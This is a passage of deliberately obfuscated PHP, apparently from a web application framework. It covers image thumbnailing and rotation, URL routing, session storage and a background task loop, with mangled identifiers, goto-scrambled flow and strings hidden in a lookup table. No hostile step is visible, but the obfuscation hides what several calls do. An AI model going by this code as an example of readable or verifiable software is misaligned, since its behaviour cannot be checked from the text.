$dÖÃ†‡ë - $BÀÖ™Ö“®]); } break; } break; default: $AĞï¯Ê¾¿Û = fread($e¸Ì»âÚñ, 1); if ($AĞï¯Ê¾¿Û === !1) { imagedestroy($Báæ°­å§œ); return !1; } list(, $bœôšØª÷, $AÒñèÉù¢’) = unpack($aíÂêŒ‘[1837], $aª‰÷Í›Ö . $AĞï¯Ê¾¿Û); for ($eªß¦ŒÅÃ = 0, $aàğŸÃ’Ú˜ = 0; $eªß¦ŒÅÃ < $bœôšØª÷; ++$eªß¦ŒÅÃ, ++$cš—øËË, $aàğŸÃ’Ú˜ += $DÓ¿¤Ğóôî) { $BÀÖ™Ö“® = $aàğŸÃ’Ú˜ & 7; imagesetpixel($Báæ°­å§œ, $cš—øËË, $Cší‚ƒ®ª¡, $aïÔÚÕê§Ù[($AÒñèÉù¢’ & $AŒØˆó”ñ‡ >> $BÀÖ™Ö“®) >> $dÖÃ†‡ë - $BÀÖ™Ö“®]); } break; } } } else { for ($cÚÏÅÚñò = 0; $cÚÏÅÚñò < $Aç£“ãÉíË; ++$cÚÏÅÚñò, $Cší‚ƒ®ª¡ += $AŸŒŒ„‚‘„) { $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, $dºöœ†¤Áñ); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } $aàğŸÃ’Ú˜ = 0; for ($cš—øËË = 0; $cš—øËË < $bçµ×ê•ó”; ++$cš—øËË, $aàğŸÃ’Ú˜ += $DÓ¿¤Ğóôî) { list(, $AÒñèÉù¢’) = unpack($aíÂêŒ‘[1838], $aª‰÷Í›Ö[$aàğŸÃ’Ú˜ >> 3]); $BÀÖ™Ö“® = $aàğŸÃ’Ú˜ & 7; imagesetpixel($Báæ°­å§œ, $cš—øËË, $Cší‚ƒ®ª¡, $aïÔÚÕê§Ù[($AÒñèÉù¢’ & $AŒØˆó”ñ‡ >> $BÀÖ™Ö“®) >> $dÖÃ†‡ë - $BÀÖ™Ö“®]); } } } goto Eù¡³¾šÓÇ; Eù¡³¾šÓÇ: } else { goto c·í£˜˜ÇÓ; fÛ£åŸ”Ù“: for ($cÚÏÅÚñò = 0; $cÚÏÅÚñò < $Aç£“ãÉíË; ++$cÚÏÅÚñò, $Cší‚ƒ®ª¡ += $AŸŒŒ„‚‘„) { $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, $dºöœ†¤Áñ); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } $aàğŸÃ’Ú˜ = 0; for ($cš—øËË = 0; $cš—øËË < $bçµ×ê•ó”; ++$cš—øËË, $aàğŸÃ’Ú˜ += $AÏ­¿‡ßÎ) { list(, $AÒñèÉù¢’) = unpack($aíÂêŒ‘[1815], substr($aª‰÷Í›Ö, $aàğŸÃ’Ú˜, $AÏ­¿‡ßÎ) . $aíÂêŒ‘[1839]); $b‹¡ÃÌµ£ = $AÒñèÉù¢’ & $bëÓ–¿±İ‰; $c•Úò¼«ë = $AÒñèÉù¢’ & $aõĞ„Øíì; $AæªËëÆ¸Æ = $AÒñèÉù¢’ & $C”…×—§; $f®×˜š‚Ê = $AÒñèÉù¢’ & $b×Ì‰ğöÖ™; $AÊ™«Šò­İ = $fêëªæÜš˜ - (($b‹¡ÃÌµ£ << 7) - $b‹¡ÃÌµ£) * $c“İİ‡»îÑ; $Bê Ü©êßÊ = (($c•Úò¼«ë << 8) - $c•Úò¼«ë) * $cŸºµÃøäŞ; $D§ºÊ¯£Ûù = (($AæªËëÆ¸Æ << 8) - $AæªËëÆ¸Æ) * $Fâìğ½ãö”; $BÀÖ™Ö“® = (($f®×˜š‚Ê << 8) - $f®×˜š‚Ê) * $a‹ÊÜˆõËê; imagesetpixel($Báæ°­å§œ, $cš—øËË, $Cší‚ƒ®ª¡, $AÊ™«Šò­İ << 24 | $Bê Ü©êßÊ << 16 | $D§ºÊ¯£Ûù << 8 | $BÀÖ™Ö“®); } } imagealphablending($Báæ°­å§œ, !0); goto Dƒ¹‹Ö»Õ; c·í£˜˜ÇÓ: $Báæ°­å§œ = imagecreatetruecolor($bçµ×ê•ó”, $Aç£“ãÉíË); imagealphablending($Báæ°­å§œ, !1); if ($bëÓ–¿±İ‰) { imagesavealpha($Báæ°­å§œ, !0); } goto a³ÇÍÒ”òÃ; a³ÇÍÒ”òÃ: $AÏ­¿‡ßÎ = $DÓ¿¤Ğóôî >> 3; $fêëªæÜš˜ = $bëÓ–¿±İ‰ ? 127 : 0; $c“İİ‡»îÑ = $bëÓ–¿±İ‰ ? 1 / $bëÓ–¿±İ‰ : 1; goto B‡‚öİ¯¾¬; B‡‚öİ¯¾¬: $cŸºµÃøäŞ = $aõĞ„Øíì ? 1 / $aõĞ„Øíì : 1; $Fâìğ½ãö” = $C”…×—§ ? 1 / $C”…×—§ : 1; $a‹ÊÜˆõËê = $b×Ì‰ğöÖ™ ? 1 / $b×Ì‰ğöÖ™ : 1; goto fÛ£åŸ”Ù“; Dƒ¹‹Ö»Õ: } return $Báæ°­å§œ; goto bŞŞÆõÖŞ¥; fÒİÌ„ğÄ: $aíÂêŒ‘ =& $_SERVER[Õİõş]; if ($eË©—‚ô…‡[$aíÂêŒ‘[384]] != 19778) { return !1; } $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, 4); goto F‚ù²‰’Âä; EøºŞ‡ª: $Aç£“ãÉíË = abs($bÇÌË­ÁãŠ); $Cší‚ƒ®ª¡ = $bÇÌË­ÁãŠ > 0 ? $Aç£“ãÉíË - 1 : 0; $AŸŒŒ„‚‘„ = $bÇÌË­ÁãŠ > 0 ? -1 : 1; goto a£çïôŠœĞ; bŞŞÆõÖŞ¥: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($cÀ´šîèß´, $cø¸§Ñ®Ñ) { goto DĞ˜ÉÊ ²; DĞ˜ÉÊ ²: $this->srcFile = $cÀ´šîèß´; $this->echoType = $cø¸§Ñ®Ñ; $this->im = self::image($cÀ´šîèß´); goto fõêÓëÆè; fõêÓëÆè: if (!$this->im) { return !1; } $Bºïæöá…– = $_SERVER[Õİõş][33]; $this->imgData = GetImageSize($cÀ´šîèß´, $Bºïæöá…–); goto f÷ìØÜ´ç; f÷ìØÜ´ç: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto D±‹Ö³¡»«; D±‹Ö³¡»«: } public static function image($E«Âåº•É–) { $béíí™ªãÌ =& $_SERVER[Õİõş]; $b–šƒ¼«Ê‡ = $béíí™ªãÌ[33]; $fÓÙ‡ùÛ‡ = GetImageSize($E«Âåº•É–, $b–šƒ¼«Ê‡); $a±£’†¿«Š = !1; switch ($fÓÙ‡ùÛ‡[2]) { case IMAGETYPE_GIF: if (!function_exists($béíí™ªãÌ[1840])) { break; } $a±£’†¿«Š = imagecreatefromgif($E«Âåº•É–); break; case IMAGETYPE_JPEG: if (!function_exists($béíí™ªãÌ[1841])) { break; } $a±£’†¿«Š = imagecreatefromjpeg($E«Âåº•É–); break; case IMAGETYPE_PNG: if (!function_exists($béíí™ªãÌ[1842])) { break; } $a±£’†¿«Š = @imagecreatefrompng($E«Âåº•É–); imagesavealpha($a±£’†¿«Š, !0); break; case IMAGETYPE_XBM: $a±£’†¿«Š = imagecreatefromxbm($E«Âåº•É–); break; case IMAGETYPE_WBMP: $a±£’†¿«Š = imagecreatefromwbmp($E«Âåº•É–); break; case IMAGETYPE_BMP: $a±£’†¿«Š = imagecreatefrombmp($E«Âåº•É–); break; default: break; } return $a±£’†¿«Š; } public static function imageSize($aæ¡˜Ò“Î) { $D¦¥‡¾õÊó =& $_SERVER[Õİõş]; $d©†µ‡ÀšÓ = GetImageSize($aæ¡˜Ò“Î); if (!$d©†µ‡ÀšÓ) { return !1; } return array($D¦¥‡¾õÊó[1843] => $d©†µ‡ÀšÓ[0], $D¦¥‡¾õÊó[1844] => $d©†µ‡ÀšÓ[1]); } function distortion($E¢„¯œ¤Óƒ, $b³‡ä‰†î¶, $c†›çªïò) { $B”Á¸ÕÕÁ = $this->creatImage($this->im, $b³‡ä‰†î¶, $c†›çªïò, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($B”Á¸ÕÕÁ, $E¢„¯œ¤Óƒ); } function prorate($d‰†Ôìï’¢, $eÛŒéà¼ƒâ, $d¹êÌÄ¸µ) { $aƒŒ“Œ’ßÚ = $eÛŒéà¼ƒâ / $d¹êÌÄ¸µ; $DŠùÚŠ³˜¦ = $this->srcW / $this->srcH; if ($aƒŒ“Œ’ßÚ <= $DŠùÚŠ³˜¦) { $bÌ‰•éïâö = $eÛŒéà¼ƒâ; $f…Ë‡…ª¬ = $bÌ‰•éïâö * ($this->srcH / $this->srcW); } else { $f…Ë‡…ª¬ = $d¹êÌÄ¸µ; $bÌ‰•éïâö = $f…Ë‡…ª¬ * ($this->srcW / $this->srcH); } if ($this->srcW > $eÛŒéà¼ƒâ || $this->srcH > $d¹êÌÄ¸µ) { $D×áãÅ…Ş = $this->creatImage($this->im, $bÌ‰•éïâö, $f…Ë‡…ª¬, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D×áãÅ…Ş, $d‰†Ôìï’¢); } else { $D×áãÅ…Ş = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D×áãÅ…Ş, $d‰†Ôìï’¢); } } function cut($bãŠ…¥Ÿ±É, $d¡ŒŸ¸ß“°, $cÒÒƒÉ¥´Å) { goto fÇœ³ãš–; fÜˆ‰×èä¥: return $this->echoImage($f¸‡¢‚ßÈò, $bãŠ…¥Ÿ±É); goto bì§âŒµ; fÇœ³ãš–: $aº•˜Ì¨Ç = $d¡ŒŸ¸ß“° / $cÒÒƒÉ¥´Å; $eîÁãÚÒàÃ = $this->srcW / $this->srcH; if ($aº•˜Ì¨Ç <= $eîÁãÚÒàÃ) { $F÷Û‚›»Ú = $cÒÒƒÉ¥´Å; $a‰æÊçé÷¯ = $F÷Û‚›»Ú * ($this->srcW / $this->srcH); } else { $a‰æÊçé÷¯ = $d¡ŒŸ¸ß“°; $F÷Û‚›»Ú = $a‰æÊçé÷¯ * ($this->srcH / $this->srcW); } goto F¢æÃÍ¿¢Ã; F¢æÃÍ¿¢Ã: $EÂÌ—àÊ¢µ = $this->creatImage($this->im, $a‰æÊçé÷¯, $F÷Û‚›»Ú, 0, 0, 0, 0, $this->srcW, $this->srcH); $f¸‡¢‚ßÈò = $this->creatImage($EÂÌ—àÊ¢µ, $d¡ŒŸ¸ß“°, $cÒÒƒÉ¥´Å, 0, 0, ($a‰æÊçé÷¯ - $d¡ŒŸ¸ß“°) / 2, ($F÷Û‚›»Ú - $cÒÒƒÉ¥´Å) / 2, $d¡ŒŸ¸ß“°, $cÒÒƒÉ¥´Å); imageDestroy($EÂÌ—àÊ¢µ); goto fÜˆ‰×èä¥; bì§âŒµ: } function backFill($Bîê±˜×”Å, $bÈÌˆ»ø“°, $Dß³„Íóìò, $F¹ÖÜµ²áì = false, $Bñ”ëìˆÜğ = 255, $D¦­„ÇÅ˜· = 255, $E…“Àà’Ä« = 255) { goto EÏ˜ÇœàŒƒ; dœÅ¥»Ïº: return $this->echoImage($a±Ä»‚Š¦¯, $Bîê±˜×”Å); goto C›ƒÓ‡‹; b™œæ«íÚĞ: if ($F¹ÖÜµ²áì) { $BåÙù‹åÊ½ = imageColorTransparent($a±Ä»‚Š¦¯, $BåÙù‹åÊ½); $DÄŞ‹‚’ç = $Dß³„Íóìò - $e‡ò¸ãî†‰; } imageFilledRectangle($a±Ä»‚Š¦¯, 0, 0, $bÈÌˆ»ø“°, $Dß³„Íóìò, $BåÙù‹åÊ½); if ($this->srcW > $bÈÌˆ»ø“° || $this->srcH > $Dß³„Íóìò) { $a±ÓÜ©íàĞ = $this->creatImage($this->im, $bŠ‘°ŸªŠÍ, $e‡ò¸ãî†‰, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($bŠ‘°ŸªŠÍ < $bÈÌˆ»ø“°) { imageCopy($a±Ä»‚Š¦¯, $a±ÓÜ©íàĞ, ($bÈÌˆ»ø“° - $bŠ‘°ŸªŠÍ) / 2, 0, 0, 0, $bŠ‘°ŸªŠÍ, $e‡ò¸ãî†‰); } else { if ($e‡ò¸ãî†‰ < $Dß³„Íóìò) { imageCopy($a±Ä»‚Š¦¯, $a±ÓÜ©íàĞ, 0, $DÄŞ‹‚’ç, 0, 0, $bŠ‘°ŸªŠÍ, $e‡ò¸ãî†‰); } else { imageCopy($a±Ä»‚Š¦¯, $a±ÓÜ©íàĞ, 0, 0, 0, 0, $bŠ‘°ŸªŠÍ, $e‡ò¸ãî†‰); } } } else { imageCopyMerge($a±Ä»‚Š¦¯, $this->im, ($bÈÌˆ»ø“° - $bŠ‘°ŸªŠÍ) / 2, $DÄŞ‹‚’ç, 0, 0, $bŠ‘°ŸªŠÍ, $e‡ò¸ãî†‰, 100); } goto dœÅ¥»Ïº; EËˆß¤¹Òï: if (function_exists($_SERVER[Õİõş][1845])) { @($a±Ä»‚Š¦¯ = imageCreateTrueColor($bÈÌˆ»ø“°, $Dß³„Íóìò)); if (!$a±Ä»‚Š¦¯) { $a±Ä»‚Š¦¯ = imageCreate($bÈÌˆ»ø“°, $Dß³„Íóìò); } } else { $a±Ä»‚Š¦¯ = imageCreate($bÈÌˆ»ø“°, $Dß³„Íóìò); } $DÄŞ‹‚’ç = ($Dß³„Íóìò - $e‡ò¸ãî†‰) / 2; $BåÙù‹åÊ½ = imagecolorallocate($a±Ä»‚Š¦¯, $Bñ”ëìˆÜğ, $D¦­„ÇÅ˜·, $E…“Àà’Ä«); goto b™œæ«íÚĞ; EÏ˜ÇœàŒƒ: $dâÖ ­´Œ· = $bÈÌˆ»ø“° / $Dß³„Íóìò; $a«¬¥ìœ = $this->srcW / $this->srcH; if ($dâÖ ­´Œ· <= $a«¬¥ìœ) { $bŠ‘°ŸªŠÍ = $bÈÌˆ»ø“°; $e‡ò¸ãî†‰ = $bŠ‘°ŸªŠÍ * ($this->srcH / $this->srcW); } else { $e‡ò¸ãî†‰ = $Dß³„Íóìò; $bŠ‘°ŸªŠÍ = $e‡ò¸ãî†‰ * ($this->srcW / $this->srcH); } goto EËˆß¤¹Òï; C›ƒÓ‡‹: } function creatImage($dëƒ¢‚ã¬î, $C¥¤‚ƒ¥Ôó, $FØ§÷³¡•, $BÌ…Ã‚‹£ƒ, $cÎÙâÒÌÜÂ, $B‰ö†á­, $CÌ¸ø«„È, $e ğÔí£ç, $A¯–¨İøã†) { if (function_exists($_SERVER[Õİõş][1845])) { @($CºÀÖ²µÉÓ = ImageCreateTrueColor($C¥¤‚ƒ¥Ôó, $FØ§÷³¡•)); @imagealphablending($CºÀÖ²µÉÓ, !1); @imagesavealpha($CºÀÖ²µÉÓ, !0); if ($CºÀÖ²µÉÓ) { imageCopyResampled($CºÀÖ²µÉÓ, $dëƒ¢‚ã¬î, $BÌ…Ã‚‹£ƒ, $cÎÙâÒÌÜÂ, $B‰ö†á­, $CÌ¸ø«„È, $C¥¤‚ƒ¥Ôó, $FØ§÷³¡•, $e ğÔí£ç, $A¯–¨İøã†); } else { $CºÀÖ²µÉÓ = ImageCreate($C¥¤‚ƒ¥Ôó, $FØ§÷³¡•); imageCopyResized($CºÀÖ²µÉÓ, $dëƒ¢‚ã¬î, $BÌ…Ã‚‹£ƒ, $cÎÙâÒÌÜÂ, $B‰ö†á­, $CÌ¸ø«„È, $C¥¤‚ƒ¥Ôó, $FØ§÷³¡•, $e ğÔí£ç, $A¯–¨İøã†); } } else { $CºÀÖ²µÉÓ = ImageCreate($C¥¤‚ƒ¥Ôó, $FØ§÷³¡•); imageCopyResized($CºÀÖ²µÉÓ, $dëƒ¢‚ã¬î, $BÌ…Ã‚‹£ƒ, $cÎÙâÒÌÜÂ, $B‰ö†á­, $CÌ¸ø«„È, $C¥¤‚ƒ¥Ôó, $FØ§÷³¡•, $e ğÔí£ç, $A¯–¨İøã†); } return $CºÀÖ²µÉÓ; } public function imgRotate($c£Æ§Ü£‡º, $F½ç»¤˜Ñ) { goto d† ÚØÊÍ; eò×ù¤öñ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $b„…¾‘öçÒ = imagegif($dÊêè›ÓÂÓ, $c£Æ§Ü£‡º); break; case IMAGETYPE_JPEG: $b„…¾‘öçÒ = imagejpeg($dÊêè›ÓÂÓ, $c£Æ§Ü£‡º, 100); break; case IMAGETYPE_PNG: $b„…¾‘öçÒ = imagePNG($dÊêè›ÓÂÓ, $c£Æ§Ü£‡º); break; default: break; } imageDestroy($dÊêè›ÓÂÓ); imageDestroy($this->im); goto d—÷ç¡‹­; d—÷ç¡‹­: return $b„…¾‘öçÒ; goto DÕô§å…ÂØ; d† ÚØÊÍ: if (!$this->im || $F½ç»¤˜Ñ % 360 === 0 || !function_exists($_SERVER[Õİõş][1846])) { return !1; } $dÊêè›ÓÂÓ = imageRotate($this->im, 360 - $F½ç»¤˜Ñ, 0); $b„…¾‘öçÒ = !1; goto eò×ù¤öñ; DÕô§å…ÂØ: } function echoImage($FÑ×Ùïê¸î, $CÑ²Ñ¼ø) { goto cÑŒì¢ì¿¡; AôÁç©Œšª: $eé¸ÉºåÎã = !1; switch ($this->echoType) { case $bõ…‡½¿Å[1847]: $eé¸ÉºåÎã = imagePNG($FÑ×Ùïê¸î); break; case $bõ…‡½¿Å[163]: $eé¸ÉºåÎã = imagePNG($FÑ×Ùïê¸î, $CÑ²Ñ¼ø); break; } imageDestroy($FÑ×Ùïê¸î); goto c»Ÿ¼šõªÇ; c»Ÿ¼šõªÇ: imageDestroy($this->im); return $eé¸ÉºåÎã; goto b²°¹Œ¬‚î; cÑŒì¢ì¿¡: $bõ…‡½¿Å =& $_SERVER[Õİõş]; if (!$FÑ×Ùïê¸î) { return !1; } ob_get_clean(); goto AôÁç©Œšª; b²°¹Œ¬‚î: } } goto a¸½ÂÌªÕ½; B©º»¥ïÅÆ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\x5e\57\135\x2b", "\72\156\x75\155" => "\x5b\60\x2d\71\x5d\53", "\x3a\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($C¢í¼×ÁÜÄ, $EÚŞ³ìÉ„œ) { $d²‘˜¼‡·¬ =& $_SERVER[Õİõş]; if ($C¢í¼×ÁÜÄ == $d²‘˜¼‡·¬[1366]) { $fÏŸ¼­£éÖ = array_map($d²‘˜¼‡·¬[1367], $EÚŞ³ìÉ„œ[0]); $aè“ĞĞÅ˜“ = strpos($EÚŞ³ìÉ„œ[1], $d²‘˜¼‡·¬[8]) === 0 ? $EÚŞ³ìÉ„œ[1] : $d²‘˜¼‡·¬[8] . $EÚŞ³ìÉ„œ[1]; $Eôé‡Ì™İ° = $EÚŞ³ìÉ„œ[2]; } else { $fÏŸ¼­£éÖ = null; $aè“ĞĞÅ˜“ = strpos($EÚŞ³ìÉ„œ[0], $d²‘˜¼‡·¬[8]) === 0 ? $EÚŞ³ìÉ„œ[0] : $d²‘˜¼‡·¬[8] . $EÚŞ³ìÉ„œ[0]; $Eôé‡Ì™İ° = $EÚŞ³ìÉ„œ[1]; } array_push(self::$maps, $fÏŸ¼­£éÖ); array_push(self::$routes, $aè“ĞĞÅ˜“); array_push(self::$methods, strtoupper($C¢í¼×ÁÜÄ)); array_push(self::$callbacks, $Eôé‡Ì™İ°); } public static function error($E¹Æ™×­—) { self::$errorCallback = $E¹Æ™×­—; } public static function haltOnMatch($fÅ¹à¢ÁãÅ = true) { self::$halts = $fÅ¹à¢ÁãÅ; } public static function dispatch() { goto DŒ¯ùéåïÓ; DŒ¯ùéåïÓ: $eªË¥ŞÍÒš =& $_SERVER[Õİõş]; $cš‚¼¤ÇŒå = parse_url($_SERVER[$eªË¥ŞÍÒš[1368]], PHP_URL_PATH); $fñÁ¾ì…ö = $_SERVER[$eªË¥ŞÍÒš[150]]; goto Fè»Ï™±š; Fè»Ï™±š: $EãÑÚöêïÙ = array_keys(static::$patterns); $bÁ½”‡¤•¨ = array_values(static::$patterns); $b‡¤èî“ÜÖ = !1; goto f¹‚Ìø¾°º; f¹‚Ìø¾°º: self::$routes = preg_replace($eªË¥ŞÍÒš[1076], $eªË¥ŞÍÒš[8], self::$routes); if (in_array($cš‚¼¤ÇŒå, self::$routes)) { $B‚¿‡­šŠ = array_keys(self::$routes, $cš‚¼¤ÇŒå); foreach ($B‚¿‡­šŠ as $BÊ‡öƒÖ‹…) { if (self::$methods[$BÊ‡öƒÖ‹…] == $fñÁ¾ì…ö || self::$methods[$BÊ‡öƒÖ‹…] == $eªË¥ŞÍÒš[1369] || in_array($fñÁ¾ì…ö, self::$maps[$BÊ‡öƒÖ‹…])) { $b‡¤èî“ÜÖ = !0; if (!is_object(self::$callbacks[$BÊ‡öƒÖ‹…])) { $CùêƒÛÍ‘ = explode($eªË¥ŞÍÒš[8], self::$callbacks[$BÊ‡öƒÖ‹…]); $DÛŒåÛÛ = end($CùêƒÛÍ‘); $EÁ²‹òÅ‹— = explode($eªË¥ŞÍÒš[1370], $DÛŒåÛÛ); $d§«ÀìÉÀñ = new $EÁ²‹òÅ‹—[0](); $d§«ÀìÉÀñ->{$EÁ²‹òÅ‹—[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$BÊ‡öƒÖ‹…]); if (self::$halts) { return; } } } } } else { $A¥Ÿ‰è×®‰ = 0; foreach (self::$routes as $BÊ‡öƒÖ‹…) { if (strpos($BÊ‡öƒÖ‹…, $eªË¥ŞÍÒš[4]) !== !1) { $BÊ‡öƒÖ‹… = str_replace($EãÑÚöêïÙ, $bÁ½”‡¤•¨, $BÊ‡öƒÖ‹…); } if (preg_match($eªË¥ŞÍÒš[1371] . $BÊ‡öƒÖ‹… . $eªË¥ŞÍÒš[1372], $cš‚¼¤ÇŒå, $D’Ÿ‚ˆÕÜ)) { if (self::$methods[$A¥Ÿ‰è×®‰] == $fñÁ¾ì…ö || self::$methods[$A¥Ÿ‰è×®‰] == $eªË¥ŞÍÒš[1369] || !empty(self::$maps[$A¥Ÿ‰è×®‰]) && in_array($fñÁ¾ì…ö, self::$maps[$A¥Ÿ‰è×®‰])) { $b‡¤èî“ÜÖ = !0; array_shift($D’Ÿ‚ˆÕÜ); if (!is_object(self::$callbacks[$A¥Ÿ‰è×®‰])) { $CùêƒÛÍ‘ = explode($eªË¥ŞÍÒš[8], self::$callbacks[$A¥Ÿ‰è×®‰]); $DÛŒåÛÛ = end($CùêƒÛÍ‘); $EÁ²‹òÅ‹— = explode($eªË¥ŞÍÒš[1370], $DÛŒåÛÛ); $d§«ÀìÉÀñ = new $EÁ²‹òÅ‹—[0](); if (!method_exists($d§«ÀìÉÀñ, $EÁ²‹òÅ‹—[1])) { echo $eªË¥ŞÍÒš[1373]; } else { call_user_func_array(array($d§«ÀìÉÀñ, $EÁ²‹òÅ‹—[1]), $D’Ÿ‚ˆÕÜ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$A¥Ÿ‰è×®‰], $D’Ÿ‚ˆÕÜ); if (self::$halts) { return; } } } } $A¥Ÿ‰è×®‰++; } } if ($b‡¤èî“ÜÖ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $f¸•½ÕÙˆ =& $_SERVER[Õİõş]; header($_SERVER[$f¸•½ÕÙˆ[1374]] . $f¸•½ÕÙˆ[1375]); echo $f¸•½ÕÙˆ[1376]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eªË¥ŞÍÒš[1368]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cæçíƒŠóñ; cæçíƒŠóñ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aä×óÈä‰ˆ; aä×óÈä‰ˆ: $dÑÌ¸‰Úª÷ =& $_SERVER[Õİõş]; static $d™¿¨†îÃ = false; if ($d™¿¨†îÃ) { return $d™¿¨†îÃ; } goto b˜´À¾‡ÖÆ; aÓ¶ÛÌ¥æ½: return $d™¿¨†îÃ; goto b«ÊãÊÜõ­; CäÉ²»ŸŠ‚: $Fšä…ÔÏ» = $e¢ÂİñóŞÜ[$dÑÌ¸‰Úª÷[1379]]; $C«µ‰ŠÁÆˆ = $e¢ÂİñóŞÜ[$Fšä…ÔÏ»]; $AîÆ¤¤ëİ† = $e¢ÂİñóŞÜ[$dÑÌ¸‰Úª÷[756]]; goto BÒ¨ƒ‘ÜÃ; BÒ¨ƒ‘ÜÃ: switch ($Fšä…ÔÏ») { case $dÑÌ¸‰Úª÷[17]: self::$handle = Model($dÑÌ¸‰Úª÷[757]); break; case $dÑÌ¸‰Úª÷[758]: self::$handle = new CacheRedis($C«µ‰ŠÁÆˆ, $AîÆ¤¤ëİ†); break; case $dÑÌ¸‰Úª÷[759]: self::$handle = new CacheMemcached($C«µ‰ŠÁÆˆ, $AîÆ¤¤ëİ†); break; case $dÑÌ¸‰Úª÷[163]: $C«µ‰ŠÁÆˆ[$dÑÌ¸‰Úª÷[75]] = $C«µ‰ŠÁÆˆ[$dÑÌ¸‰Úª÷[75]] . $dÑÌ¸‰Úª÷[1380]; self::$handle = new CacheFile($C«µ‰ŠÁÆˆ, $AîÆ¤¤ëİ†); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $d™¿¨†îÃ = new self(); goto aÓ¶ÛÌ¥æ½; C¥Œ¾‡¼¦æ: $EÄ†˜Õ¦îå = _get($GLOBALS, $dÑÌ¸‰Úª÷[1378], $EÄ†˜Õ¦îå); if (self::$sessionSign) { } else { if (Cookie::get($EÄ†˜Õ¦îå)) { self::$sessionSign = Cookie::get($EÄ†˜Õ¦îå); } else { self::$sessionSign = guid(); } } Cookie::setSafe($EÄ†˜Õ¦îå, self::$sessionSign, self::$sessionTime); goto CäÉ²»ŸŠ‚; b˜´À¾‡ÖÆ: $e¢ÂİñóŞÜ = $GLOBALS[$dÑÌ¸‰Úª÷[6]][$dÑÌ¸‰Úª÷[333]]; self::$sessionTime = $e¢ÂİñóŞÜ[$dÑÌ¸‰Úª÷[1377]]; $EÄ†˜Õ¦îå = SESSION_ID; goto C¥Œ¾‡¼¦æ; b«ÊãÊÜõ­: } public static function sign($AÅÉñ¬‹± = false) { $AÅÉñ¬‹± && (self::$sessionSign = $AÅÉñ¬‹±); self::init(); return self::$sessionSign; } public static function set($EöØô’‡Š¢, $AÄŠ¬®²Ôö = false) { self::init(); if (is_array($EöØô’‡Š¢)) { foreach ($EöØô’‡Š¢ as $DÁ¿Ğ‚«çÓ => $a¹ç‘™ƒ¦ë) { array_set_value(self::$data, $DÁ¿Ğ‚«çÓ, $a¹ç‘™ƒ¦ë); } } else { array_set_value(self::$data, $EöØô’‡Š¢, $AÄŠ¬®²Ôö); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($d–¸±Å™« = false) { self::init(); if (!$d–¸±Å™«) { return self::$data; } return array_get_value(self::$data, $d–¸±Å™«); } public static function remove($dÆŠã…Äá‚) { self::init(); unset(self::$data[$dÆŠã…Äá‚]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Õİõş][761])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto dÏ‡İ‡¥ƒƒ; dÏ‡İ‡¥ƒƒ: $DÉ²÷Ö§´Ç =& $_SERVER[Õİõş]; if (self::valueGet($DÉ²÷Ö§´Ç[691]) != $DÉ²÷Ö§´Ç[83]) { return; } if (self::valueGet($DÉ²÷Ö§´Ç[1381]) == $DÉ²÷Ö§´Ç[83]) { $DäÄ‰³ìÚ = self::valueGet($DÉ²÷Ö§´Ç[1382]); if (time() - $DäÄ‰³ìÚ > 3600 * 2) { self::restart(); } return; } goto C§˜²÷øĞš; C§˜²÷øĞš: http_close(); self::valueSet($DÉ²÷Ö§´Ç[1381], $DÉ²÷Ö§´Ç[83]); Hook::bind($DÉ²÷Ö§´Ç[1383], $DÉ²÷Ö§´Ç[1384]); goto C‰—ÅÕ‚²; C‰—ÅÕ‚²: while (!0) { self::cacheClear(); if (self::valueGet($DÉ²÷Ö§´Ç[691]) != $DÉ²÷Ö§´Ç[83]) { self::valueSet($DÉ²÷Ö§´Ç[1381], $DÉ²÷Ö§´Ç[463]); self::log($DÉ²÷Ö§´Ç[1385]); die; } self::valueSet($DÉ²÷Ö§´Ç[1381], $DÉ²÷Ö§´Ç[83]); self::valueSet($DÉ²÷Ö§´Ç[1382], time()); self::taskRunAll(); sleep(self::valueGet($DÉ²÷Ö§´Ç[1386])); } goto FÛ¾ä•ß¦; FÛ¾ä•ß¦: } public static function restart() { $Bµ®Ğç‘øî =& $_SERVER[Õİõş]; http_close(); self::valueSet($Bµ®Ğç‘øî[691], $Bµ®Ğç‘øî[463]); sleep(self::valueGet($Bµ®Ğç‘øî[1386]) + 5); self::valueSet($Bµ®Ğç‘øî[1381], $Bµ®Ğç‘øî[463]); self::valueSet($Bµ®Ğç‘øî[691], $Bµ®Ğç‘øî[83]); } public static function shutdownEvent() { $e–ê—¯Š‚› =& 